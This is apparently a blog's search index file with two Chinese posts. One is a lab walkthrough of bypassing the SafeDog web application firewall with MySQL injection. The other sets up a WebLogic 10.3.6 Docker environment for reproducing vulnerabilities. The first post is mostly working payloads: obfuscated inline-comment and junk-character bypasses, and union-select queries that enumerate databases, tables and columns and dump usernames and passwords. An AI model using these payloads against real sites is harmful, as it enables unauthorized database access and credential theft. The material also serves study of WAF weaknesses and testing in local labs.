<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>sql注入绕过安全狗</title>
      <link href="/posts/fdcd.html"/>
      <url>/posts/fdcd.html</url>
      
        <content type="html"><![CDATA[<p>前言：之前看过了，一直没动手，不是个好习惯，要多动手多思考多钻研</p><h1 id="sql注入之安全狗绕过"><a href="#sql注入之安全狗绕过" class="headerlink" title="sql注入之安全狗绕过"></a>sql注入之安全狗绕过</h1><p>官网下载的安全狗版本还是0.30255，这个绕过方式5月份就有了。</p><h3 id="0x1环境准备"><a href="#0x1环境准备" class="headerlink" title="0x1环境准备"></a>0x1环境准备</h3><p>win7  </p><p>WAF：安全狗4.0  0.30255</p><p>phpstudy2017</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/%E5%AE%89%E5%85%A8%E7%8B%97.png" alt="安全狗"></p><h3 id="0x2基础知识理解"><a href="#0x2基础知识理解" class="headerlink" title="0x2基础知识理解"></a>0x2基础知识理解</h3><p>1.一般绕过安全狗很多都是注释符号去绕过，然而但是/**/最简单的方式是不行，但是可以在里面加一些垃圾字符可以绕过，也是需要去FUZZ测试，因为安全狗也会对里面的内容做了过滤</p><p>2.内联注释 /<em>!</em>/，在mysql里面内联注释有一个特性，如果里面的内容超出了当前的mysql版本就会报错，没有超出就不会报错</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002174138478.png" alt="image-20211002174138478"></p><ul><li>/<em>!select</em>/: 直接会之执行里面的函数</li><li>/<em>!12345select</em>/: 当12345小于当前mysql版本号的时候，注释不生效，当大于版本号的时候注释生效。</li><li>/<em>![]</em>/: []中括号中的数字若填写则必须是5位 </li></ul><p>3.mysql还有一个原理：</p><p>正常情况</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002174156566.png" alt="image-20211002174156566"></p><p>加几个空格，发现也是可以的</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002174240358.png" alt="image-20211002174240358"></p><p>那么在括号里面添加空格</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002174311955.png" alt="image-20211002174311955"></p><p>加个注释符号也是可以绕过的</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002174352832.png" alt="image-20211002174352832"></p><h3 id="0x3开始FUZZ测试"><a href="#0x3开始FUZZ测试" class="headerlink" title="0x3开始FUZZ测试"></a>0x3开始FUZZ测试</h3><p>FUZZ一波，看看那些被过滤，哪些没有过滤(实战的时候还是不要去跑fuzz脚本了)</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002174508632.png" alt="image-20211002174508632"></p><p>因为他服务器那边都能看到你的记录的，直接给你封了ip</p><pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' and 1 拦截1'</span> and <span class="token string">'1 拦截1'</span> and a 绕过  //测试了好几个，里面不管是单个字母还是多个字母都绕过了1<span class="token string">' and '</span>a<span class="token string">' 拦截 1'</span> and hex<span class="token punctuation">(</span>1<span class="token punctuation">)</span> 拦截1' and ord<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span> 不拦截<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>and不拦截 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-判断是否存在sql注入"><a href="#1-判断是否存在sql注入" class="headerlink" title="1.判断是否存在sql注入"></a>1.判断是否存在sql注入</h4><p>因为在真实环境中需要去检验是否存在sql注入，才有后续的步骤。</p><pre class="line-numbers language-bash"><code class="language-bash">?id<span class="token operator">=</span>1<span class="token string">' and ord("a")-96 --+?id=1'</span> and ord<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span>-97 --+   //这两个payload就相当于and 1<span class="token operator">=</span>1  and 1<span class="token operator">=</span>2 去检查是否存在sql注入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002174814207.png" alt="image-20211002174814207"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002174829065.png" alt="image-20211002174829065"></p><h4 id="2-fuzz哪些函数能绕过"><a href="#2-fuzz哪些函数能绕过" class="headerlink" title="2.fuzz哪些函数能绕过"></a>2.fuzz哪些函数能绕过</h4><pre class="line-numbers language-bash"><code class="language-bash">测试过程就不放截图了order 不拦截order by 拦截 union 不拦截union <span class="token keyword">select</span> 拦截order%20by 拦截order%20%0aby 拦截order/*by*/没有被拦截 ，思路打开尝试注释去绕过了order/**/by 拦截  那么直接往里面添加一些垃圾字符绕过<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-打开burp-fuzz垃圾字符"><a href="#3-打开burp-fuzz垃圾字符" class="headerlink" title="3.打开burp fuzz垃圾字符"></a>3.打开burp fuzz垃圾字符</h4><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002174927425.png" alt="image-20211002174927425"></p><p>爆破</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002175022519.png" alt="image-20211002175022519"></p><p>可以看到还是有很多垃圾字符可以绕过</p><pre class="line-numbers language-bash"><code class="language-bash">/*/%-//*/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在尝试order by,绕过了</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002175105435.png" alt="image-20211002175105435"></p><h4 id="4-union-select"><a href="#4-union-select" class="headerlink" title="4.union select"></a>4.union select</h4><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002175132953.png" alt="image-20211002175132953"></p><p>union这种就在绕不过了，不过在apache3.5版本这个方法可以绕过</p><p>测试一下哪些可以绕过</p><pre class="line-numbers language-bash"><code class="language-bash">-1<span class="token string">'  union /*/%-//*/ /*!select*/ 1,2,3 --+  拦截-1'</span>  union /*/%-//*/ /*<span class="token operator">!</span>12345select*/ 1,2,3 --+ 拦截-1<span class="token string">'  union /*/%-//*/ /*!12345%23%0aselect*/ 1,2,3 --+  不拦截-1'</span>  union /*<span class="token operator">!</span>12345%23%0aselect*/ 1,2,3 --+ 拦截<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里看看这个语句/<em>!12345%23%0aselect</em>/  </p><p>%23就是#   %0a换行  </p><p>总的意思就是在12345后面加了一个注释符号，当然注释符号后面就会被注释，但是这时候出现了%0a 换了一行，后面的还是正常执行</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002175305155.png" alt="image-20211002175305155"></p><h4 id="5-查询数据库"><a href="#5-查询数据库" class="headerlink" title="5.查询数据库"></a>5.查询数据库</h4><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002184648064.png" alt="image-20211002184648064"></p><p>database()被过滤了</p><p>尝试在database/<em>/%-//</em>/ ( )</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002184710516.png" alt="image-20211002184710516"></p><p>绕过了</p><p>除了上面，拓展一个方式</p><p>mysql里面的一个原理：对于正常的闭合都是有头有尾的,但是mysq里面的内联注释可以不用</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002184741131.png" alt="image-20211002184741131"></p><p>就拿这个来说，正常都是( ( ) ),但是这个是( ( )还是可以正常执行的</p><h4 id="6-查询其他库名"><a href="#6-查询其他库名" class="headerlink" title="6.查询其他库名"></a>6.查询其他库名</h4><pre><code>-1'  union /*/%-//*/ /*!12345%23%0aselect*/ 1,2,group_concat(schema_name) from information_schema.schemata --+</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002184912204.png" alt="image-20211002184912204"></p><pre><code>-1'  union /*/%-//*/ /*!12345%23%0aselect*/ 1,2,group_concat(schema_name)/*/%-//*/from/*/%-//*/information_schema.schemata --+  </code></pre><p>还是被拦截了</p><p>单独来测试函数 </p><pre class="line-numbers language-bash"><code class="language-bash">from 未拦截information未拦截information_schema 拦截information_schema.schemata 拦截from/*/%-//*/information_schema.schemata 拦截from information 未拦截from/*/%-//*/information_schema./*/%-//*/schemata 拦截<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>来试试3.5版本的</p><pre><code>/*!00000%23%0afrom*//*!00000%23%0afrom*//*/%-//*/information/*/%-//*/_schema.schemata 拦截/*!12345%23%0afrom*//*/%-//*/information_schema./*/%-//*/schemata 拦截既然不行再对information_schema.schemata试试/*!12345%23%0afrom*/ /*!information_schema.schema*/-1'  union /*/%-//*/ /*!12345%23%0aselect/*!1,2,*/ group_concat(schema_name) /*!12345%23%0afrom*/  /*!00000%23%0ainformation_schema./*!schemata*/ 拦截-1'  union /*/%-//*/ /*!12345%23%0aselect/*!1,2,*/ group_concat(schema_name) /*!from*/  /*!12345%23%0ainformation_schema./*!schemata*/ 拦截-1'  union /*/%-//*/ /*!12345%23%0aselect/*!1,2,*/ group_concat(schema_name) /*!from*/  /*!%23/*%0ainformation_schema./*!schemata*/ 拦截感觉这里对information_schema.schemata %23这里不管用了，那么就用--+-1'  union /*/%-//*/ /*!12345%23%0aselect/*!1,2,*/ group_concat(schema_name) /*!from*/  /*!12345--+%0ainformation_schema./*!schemata*/ 拦截-1'  union /*/%-//*/ /*!12345%23%0aselect/*!1,2,*/ group_concat(schema_name) /*!from*/  /*!--+/*%0ainformation_schema./*!schemata*/ 不拦截</code></pre><p>fuzz跑了一边就这个可以绕过,在前面还可以认%0a，这里information就不认了，举个例子：/!–+/<em>%0axxx</em>/</p><p>还得再加一个/<em>跟后面闭合成了注释/</em>%0axxxxx<em>/,但恰巧–+把/</em>注释了  就成了后面的xxx*/</p><p>最后就成了/<em>!xxx</em>/</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002185450014.png" alt="image-20211002185450014"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002185508516.png" alt="image-20211002185508516"></p><h4 id="7-查其他表名"><a href="#7-查其他表名" class="headerlink" title="7.查其他表名"></a>7.查其他表名</h4><pre><code>-1' union /*/%-//*/ /*!12345%23%0aselect/*!1,2,*/ group_concat(table_name) /*!from*/  /*!--+/*%0ainformation_schema./*!tables*/ where table_schema='security'--+</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002185547169.png" alt="image-20211002185547169"></p><h4 id="8-查其他列名"><a href="#8-查其他列名" class="headerlink" title="8.查其他列名"></a>8.查其他列名</h4><pre><code>-1' union /*/%-//*/ /*!12345%23%0aselect/*!1,2,*/ group_concat(column_name) /*!from*/  /*!--+/*%0ainformation_schema./*!columns*/ where table_name='users'--+</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002185617828.png" alt="image-20211002185617828"></p><h4 id="9-查数据"><a href="#9-查数据" class="headerlink" title="9.查数据"></a>9.查数据</h4><pre><code>-1' union /*/%-//*/ /*!12345%23%0aselect/*!1,2,*/ group_concat(concat_ws(0x7e,username,password)) /*!from*/  users --+-1' union /*/%-//*/ /*!12345%23%0aselect/*!1,2,*/ group_concat(concat_ws(0x7e,username,password)) /*!from*/  security.users --+</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002185644382.png" alt="image-20211002185644382"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/%E5%A5%A5%E5%8A%9B%E7%BB%99.jpg" alt="奥力给"></p><p>参考链接</p><p><a href="https://mp.weixin.qq.com/s/AyZh3RdgZ-nWzlgdnQXJzg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/AyZh3RdgZ-nWzlgdnQXJzg</a></p><p><a href="https://mp.weixin.qq.com/s/kpSMDm4qrV6ZvdJ1k_0q0A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/kpSMDm4qrV6ZvdJ1k_0q0A</a></p><p><a href="https://www.cnblogs.com/Cl0ud/default.html?page=1" target="_blank" rel="noopener">https://www.cnblogs.com/Cl0ud/default.html?page=1</a></p>]]></content>
      
      
      <categories>
          
          <category> WAF绕过 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WAF绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker创建weblogic的方式</title>
      <link href="/posts/ff3e.html"/>
      <url>/posts/ff3e.html</url>
      
        <content type="html"><![CDATA[<p>前言：较为详细的一次搭建weblogic的方式，因为vulhub上面的weblogic环境生成的tar包传不上去，才有了这用dockerfile创建的环境</p><h1 id="Docker-Weblogic-10-3-6"><a href="#Docker-Weblogic-10-3-6" class="headerlink" title="Docker-Weblogic 10.3.6"></a>Docker-Weblogic 10.3.6</h1><ul><li>基础环境准备</li><li>安装weblogic</li><li>生成weblogic基础镜像</li><li>编制 Dockerfile 定制镜像</li></ul><h2 id="基础环境准备"><a href="#基础环境准备" class="headerlink" title="基础环境准备"></a>基础环境准备</h2><p><strong>1. 拉取并保存centos镜像</strong></p><pre><code>$ sudo docker pull centos$ sudo docker save -o centos-7.2.tar centos:latest</code></pre><p><strong>2. 下载jdk rpm包</strong><br><a href="https://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase7-521261.html#jdk-7u80-oth-JPR" target="_blank" rel="noopener">rpm:jdk-7u80-64bit</a> </p><p><strong>3. 下载weblogic的zip版安装包</strong><br><a href="https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html" target="_blank" rel="noopener">ZIP: weblogic-10.3.6-develop-zip</a> </p><p><strong>4. 安装包准备</strong></p><pre><code># 新建文件夹 CVE-Docker$ mkdir CVE-Docker# 将weblogic安装包及jdk安装包拷贝至 CVE-Docker$ cp *.* /home/tim/CVE-Docker# 解压wls1036_dev.zip,解压后的顶层文件目录是wls10360$ sudo unzip wls1036_dev.zip -d wls10360</code></pre><p><strong>5. 导入centos基础镜像</strong></p><pre><code>$ sudo docker load -i centos-7.2.tar</code></pre><h2 id="安装weblogic"><a href="#安装weblogic" class="headerlink" title="安装weblogic"></a>安装weblogic</h2><pre><code># step1 运行基础centos容器,把安装包目录映射到容器的home目录中$ sudo docker run -itd -P -v /home/tim/CVE-Docker:/tmp --name "install_weblogic" centos:latest /bin/bash# step2 进入容器$ sudo docker exec -it install_weblogic /bin/bash# step3 设置root口令[root@d5896162f9fe /]# passwd rootrootroot# step4 创建weblogic用户[root@d5896162f9fe home]# useradd weblogic -p weblogic123# step5 安装jdk[root@d5896162f9fe home]# cd /tmp[root@d5896162f9fe home]# rpm -ivh jdk-7u80-linux-x64.rpm# step6 寻找jdk安装目录，并复制[root@d5896162f9fe jdk1.7.0_80]# find / -name "*jdk*"# step7 设置weblogic安装目录[root@d5896162f9fe jdk1.7.0_80]# mkdir -p /opt/Oracle/weblogic/wls10360# step8 设置环境变量，在profile尾部添加如下配置[root@d5896162f9fe jdk1.7.0_80]# vi /etc/profileexport JAVA_HOME=/usr/java/jdk1.7.0_80export PATH=$JAVA_HOME/bin:$PATHexport CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarexport MW_HOME=/opt/Oracle/weblogic/wls10360# step9 使环境变量生效[root@d5896162f9fe jdk1.7.0_80]# source /etc/profile# step10  将weblogic安装包文件拷贝至安装目录[root@d5896162f9fe wls10360]# cd /tmp/wls10360[root@d5896162f9fe wls10360]# cp -R ./* /opt/Oracle/weblogic/wls10360/# step11 将weblogic安装目录及文件所有者修改为weblogic用户[root@d5896162f9fe weblogic]# cd /opt[root@d5896162f9fe opt]# chown -R weblogic:weblogic Oracle/# step12 切换至weblogic用户[root@d5896162f9fe wls10360]# su - weblogic# step12 检查当前环境是否符合weblogic安裝要求[weblogic@d5896162f9fe ~]$ cd /opt/Oracle/weblogic/wls10360/[weblogic@d5896162f9fe wls10360]$ ./configure.sh# step13 配置weblogic初始化参数[weblogic@d5896162f9fe wls10360]$ wlserver/server/bin/setWLSEnv.sh#step14 创建weblogic域(domain)[weblogic@d5896162f9fe wls10360]$ wlserver/common/bin/config.sh#step15 选1,创建新域#step16 选1, 选择WebLogic平台组件 #step17 默认回车, Basic WebLogic Server Domain - 10.3.6.0 [wlserver]#step18 默认回车,使用base_domain作为域名#step19 默认鬼扯,使用/opt/Oracle/weblogic/wls10360/user_projects/domains作为域的安装路径#step20 选1,设置登录管理员用户名,设置为weblogic回车#step21 选2,设置登录管理员用户口令,设置为weblogic123回车#step22 选3,确认登录管理员用户口令,输入weblogic123回车#step23 回车进入下一步,选择1,开发环境#step24 选1,选择我们安装的jdk作为java环境#step25 选1,因为我们只安装单节点,所以选1,如果要部署集群则选择2#step26 默认回车,确认weblogic 管理服务信息，回车进行确认# step27 启动weblogic,测试安装成效[weblogic@d5896162f9fe wls10360]$ user_projects/domains/base_domain/startWebLogic.sh#step28 切换到root用户,安装net-tools软件包,查看服务[root@d5896162f9fe /]# yum install net-tools[root@d5896162f9fe /]# netstat -ntlp[root@d5896162f9fe /]# curl http://127.0.0.1:7001/console</code></pre><h2 id="生成weblogic基础镜像"><a href="#生成weblogic基础镜像" class="headerlink" title="生成weblogic基础镜像"></a>生成weblogic基础镜像</h2><p><strong>1. 生成weblogic基础镜像</strong></p><pre><code>$ sudo docker commit install_weblogic weblogic:10.3.6</code></pre><h2 id="编制-Dockerfile-定制镜像"><a href="#编制-Dockerfile-定制镜像" class="headerlink" title="编制 Dockerfile 定制镜像"></a>编制 Dockerfile 定制镜像</h2><p><strong>1. 编制Dockerfile文件</strong></p><pre><code># Version 1.0# base imageFROM weblogic:10.3.6# Author informationsMAINTAINER 779602274@qq.com# 将启动后的目录切换到 /home/weblogic目录WORKDIR  /home/weblogic# Add the locate file to containerADD start.sh /home/weblogic# 使用root用户来执行后续命令USER root# Running some commondsRUN source /etc/profileRUN chown weblogic:weblogic /home/weblogic/start.shRUN chmod +x /home/weblogic/start.sh# 使用weblogic用户来执行后续命令USER weblogic# Expose the port 7001EXPOSE 7001# The commond running after container startedCMD ["/home/weblogic/start.sh"]</code></pre><p><strong>2.编制附加文件start.sh</strong></p><pre><code>#!/bin/bashsource /etc/profile/opt/Oracle/weblogic/wls10360/user_projects/domains/base_domain/startWebLogic.sh</code></pre><p><strong>3.制作最终镜像</strong></p><pre><code>$ sudo docker build -t weblogic:10.3.6 .</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/11.jpg" alt="11"></p>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
